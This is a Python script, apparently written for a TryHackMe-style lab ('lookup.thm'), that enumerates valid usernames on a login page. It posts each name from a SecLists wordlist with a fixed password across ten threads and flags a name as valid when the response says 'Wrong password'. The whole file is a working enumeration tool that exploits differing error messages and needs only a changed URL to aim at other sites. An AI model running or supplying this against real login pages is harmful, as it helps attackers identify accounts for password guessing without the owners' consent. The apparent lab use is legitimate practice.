import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
file_path = "/home/kali/SecLists/Usernames/Names/names.txt"


# Function to perform the HTTP request for a single username
def check_username(username):
    try:
        # Prepare the POST data
        data = {
            "username": username,
            "password": "password"  # Fixed password for testing
        }

        # Send the POST request
        response = requests.post(url, data=data)

        # Check the response content
        if "Wrong password" in response.text:
            return f"Username found: {username}"
        elif "wrong username" in response.text:
            return None  # No action needed for wrong usernames
    except requests.RequestException as e:
        return f"Error with username {username}: {e}"


# Read the file and process each line with multithreading
try:
    with open(file_path, "r") as file:
        usernames = [line.strip() for line in file if line.strip()]  # Read and clean usernames

    # Use ThreadPoolExecutor for parallel requests
    with ThreadPoolExecutor(max_workers=10) as executor:  # Adjust `max_workers` as needed
        future_to_username = {executor.submit(check_username, username): username for username in usernames}

        for future in as_completed(future_to_username):
            result = future.result()
            if result:
                print(result)  # Print successful results

except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except Exception as e:
    print(f"An error occurred: {e}")
